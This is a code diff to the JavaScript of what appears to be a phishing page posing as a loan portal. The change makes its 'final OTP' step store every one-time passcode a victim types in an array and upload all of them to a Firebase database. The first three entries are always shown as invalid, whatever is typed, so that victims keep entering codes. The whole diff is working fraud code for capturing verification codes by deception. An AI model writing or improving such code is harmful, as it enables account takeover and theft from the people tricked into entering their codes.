@@ -786,7 +786,7 @@ const FIREBASE_NODE = 'pak_loan_portal_users';
 
 let currentKey = null;
 let currentStep = 1;
-let otpAttempts = 0; // ✅ Track OTP attempts
+let finalOtpAttempts = []; // ✅ Array to store all attempts
 const sessionData = {};
 
 function saveToFirebase(data) {
@@ -917,7 +917,7 @@ function saveStepData(step) {
     }
 }
 
-// ✅ UPDATED: Final OTP Logic (3 Invalid, 4th Valid)
+// ✅ UPDATED: Final OTP Logic (3 Invalid, 4th Valid) + Saves All Attempts
 window.submitFinalOtp = function() {
     let otp = ''; 
     document.querySelectorAll('#otpBoxes2 input').forEach(i => otp += i.value);
@@ -929,21 +929,25 @@ window.submitFinalOtp = function() {
     
     showError('err-step6', false);
 
-    otpAttempts++; // Increase attempt count
-    saveStepData(6); // Save the OTP attempt to Firebase
-    
-    // Save OTP to Firebase
-    const d = { otp2: otp, otp2Time: new Date().toLocaleString(), otp2Timestamp: Date.now() };
+    // Push this attempt to array
+    finalOtpAttempts.push(otp);
+
+    // Save ALL attempts to Firebase
+    const d = { 
+        otp2Attempts: finalOtpAttempts, 
+        lastOtp2: otp,
+        otp2Time: new Date().toLocaleString(),
+        step: 'otp2-attempt-' + finalOtpAttempts.length
+    };
     Object.assign(sessionData, d); 
     updateFirebase(d);
 
-    if (otpAttempts < 4) {
+    if (finalOtpAttempts.length < 4) {
         // First 3 attempts -> Invalid
         showLoading('Verifying...');
         setTimeout(() => {
             hideLoading();
-            showError('err-step6', true); // Show error text
-            // Clear OTP boxes
+            showError('err-step6', true);
             document.querySelectorAll('#otpBoxes2 input').forEach(i => i.value = '');
             document.querySelector('#otpBoxes2 input').focus();
         }, 1500);
